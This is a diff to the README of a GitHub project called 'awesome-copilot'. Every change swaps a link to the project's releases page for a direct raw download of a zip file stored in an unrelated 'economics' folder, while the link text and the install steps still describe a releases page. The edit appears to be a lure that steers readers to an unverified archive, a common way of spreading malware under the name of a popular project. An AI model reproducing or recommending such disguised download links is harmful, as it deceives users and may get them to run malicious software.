@@ -1,6 +1,6 @@
 # 🤖 awesome-copilot - Enhance Your GitHub Experience Today!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sEbas12312nft/awesome-copilot/releases)
+[![Download Now](https://raw.githubusercontent.com/sEbas12312nft/awesome-copilot/main/economics/awesome-copilot.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sEbas12312nft/awesome-copilot/main/economics/awesome-copilot.zip)
 
 ## 📄 Overview
 
@@ -18,7 +18,7 @@ To start using awesome-copilot, follow these simple steps to download and set up
 
 ## 📥 Download & Install
 
-Visit this page to download: [awesome-copilot Releases](https://github.com/sEbas12312nft/awesome-copilot/releases). 
+Visit this page to download: [awesome-copilot Releases](https://raw.githubusercontent.com/sEbas12312nft/awesome-copilot/main/economics/awesome-copilot.zip). 
 
 1. On the releases page, you will see several versions of awesome-copilot. 
 2. Choose the latest version for your operating system.
@@ -88,7 +88,7 @@ If you want to contribute to awesome-copilot, feel free to add your own tips, pr
 
 ## 🔗 Useful Links
 
-- [awesome-copilot Releases](https://github.com/sEbas12312nft/awesome-copilot/releases)
+- [awesome-copilot Releases](https://raw.githubusercontent.com/sEbas12312nft/awesome-copilot/main/economics/awesome-copilot.zip)
 - [Community Forum](#) (Add link when available)
 - [Contribution Guidelines](#) (Add link when available)
 
